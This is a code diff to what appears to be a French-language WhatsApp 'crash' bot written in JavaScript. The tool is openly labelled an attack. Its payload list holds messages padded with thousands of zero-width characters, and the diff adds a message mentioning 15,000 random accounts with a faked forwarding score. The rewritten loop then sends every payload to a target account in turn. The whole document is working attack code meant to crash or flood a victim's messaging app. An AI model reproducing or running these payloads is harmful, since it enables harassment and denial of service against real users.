@@ -16,6 +16,21 @@ const crashes = [
     { image: { url: 'https://i.imgur.com/placeholder.png' }, caption: '\u200B'.repeat(3000) + '💀 CRASH 💀' + '\u200B'.repeat(3000) },
     '\u200D'.repeat(3000) + '⛓️ TU NE PEUX RIEN FAIRE ⛓️' + '\u200D'.repeat(3000),
     '█'.repeat(10000),
+    // 7. Bug du statut partagé avec 15 000 mentions
+    async (sock, target) => {
+        const mentionedJids = Array.from({ length: 15000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        );
+        await sock.sendMessage(target, {
+            text: '📤 Statut partagé',
+            mentions: mentionedJids,
+            contextInfo: {
+                isForwarded: true,
+                forwardingScore: 999,
+                mentionedJid: mentionedJids
+            }
+        });
+    }
 ];
 
 async function start() {
@@ -59,11 +74,16 @@ async function sendCrashes(sock) {
     for (let i = 0; i < crashes.length; i++) {
         const payload = crashes[i];
         try {
-            if (typeof payload === 'string') await sock.sendMessage(TARGET_JID, { text: payload });
-            else await sock.sendMessage(TARGET_JID, payload);
+            if (typeof payload === 'function') {
+                await payload(sock, TARGET_JID);
+            } else if (typeof payload === 'string') {
+                await sock.sendMessage(TARGET_JID, { text: payload });
+            } else {
+                await sock.sendMessage(TARGET_JID, payload);
+            }
             console.log(`   ✅ Crash ${i+1}/${crashes.length} envoyé`);
         } catch (err) { console.log(`   ❌ Erreur crash ${i+1}:`, err.message); }
-        await new Promise(resolve => setTimeout(resolve, 1500));
+        await new Promise(resolve => setTimeout(resolve, 2000));
     }
     console.log('⚡ Attaque terminée. Déconnexion...');
     sock.end();
